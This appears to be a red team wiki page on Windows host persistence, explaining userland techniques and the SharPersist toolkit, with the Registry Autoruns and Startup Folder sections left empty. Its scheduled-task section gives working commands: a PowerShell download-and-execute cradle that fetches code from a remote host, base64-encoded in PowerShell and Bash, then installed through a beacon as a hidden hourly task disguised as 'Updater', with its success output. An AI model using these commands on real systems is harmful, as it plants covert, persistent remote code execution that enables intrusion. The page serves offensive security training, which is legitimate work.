---
title: Host Persistence
category: Red Team
order: 5
---

Persistence is the method of maintaining access to a compromised machine. Is useful to avoid exploiting the initial compromise steps all over again.

Workstations are frequently rebooted

If the initial access is obtained though a phishing campaign, and if the current beacon is lost, it could be end of the engagement. 

Install persistence usually involves making some configuration change or dropping a payload to disk, which is why they can carry a high risk of detection.

> **Note**: You must strike a delicate balance of keeping the operation going and getting caught.


# Userland Persistence

Userland persistence involves persistence that can be executed as the current user environment.

`SharPersist` is .NET windows persistence toolkit assembly  written by FireEye very useful to make a persistence.

* [https://github.com/mandiant/SharPersist](https://github.com/mandiant/SharPersist)

Common userland persistence methods are:

* HKCU / HKLM Registry Autoruns
* Scheduled Tasks
* Startup Folder

## HKCU / HKLM Registry Autoruns


## Scheduled Tasks

The Windows Task Scheduler allows us to create tasks that execute on a pre-determined trigger. That trigger could be a day, when users logon, when the computer goes idle, when its locked and more over.

In order to avoid problems of quotations in the IEX cradle, we can encode it in base64 and use the `-EncodedCommand` or `-enc` parameter.

> **Note**: Use `Unicode` enconding instead of `UTF8` or `ASCII` at base64 conversion.

In PowerShell:

```powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==
```
In Bash:

```bash
kali@kali:~# str='IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'
kali@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==
```

Finally we can use `SharPersist` to create a scheduled task.

```
beacon> execute-assembly .\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly
[+] SUCCESS: Scheduled task added
```

| **Parameter** |      **Description**      | **Values**                                                                                |
|:-------------:|:-------------------------:|-------------------------------------------------------------------------------------------|
|       -t      |   Persistence technique   | `keepass`, `reg`, `schtaskbackdoor`, `startupfolder`, `tortoisesvn`, `service`, `schtask` |
|       -c      |     Command to execute    | Ex: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`                           |
|       -a      | Arguments for the command | Ex: `-nop -w hidden -enc SQBF....A==`                                                     |
|       -n      |      Name of the task     | Ex: `Updater`                                                                             |
|       -m      |      To add the task      | `add`, `remove`, `check`, `list`                                                          |
|       -o      |       Task frequency      | `env`, `hourly`, `daily`, `logon`                                                         |

## Startup Folder

